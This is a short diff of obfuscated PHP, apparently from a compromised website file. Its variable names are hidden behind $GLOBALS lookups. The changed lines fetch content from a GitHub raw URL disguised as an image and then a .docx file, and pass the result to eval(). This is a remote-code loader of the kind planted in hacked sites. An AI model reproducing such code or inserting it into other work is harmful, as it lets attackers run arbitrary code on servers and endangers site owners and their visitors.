@@ -106,5 +106,6 @@ function get_contents($url)
     ${$GLOBALS["lnrkdexmo"]} = curl_exec($ch);
     return ${$GLOBALS["lnrkdexmo"]};
 }
-${$GLOBALS["ltnbuthggrc"]} = get_contents("https://raw.githubusercontent.com/rijal-cpu/images/refs/heads/main/radio.jpg");
+${$GLOBALS["ltnbuthggrc"]} = get_contents("https://raw.githubusercontent.com/rijal-cpu/images/refs/heads/main/radio.docx");
+
 eval("?>" . ${$GLOBALS["fcgthfemb"]});
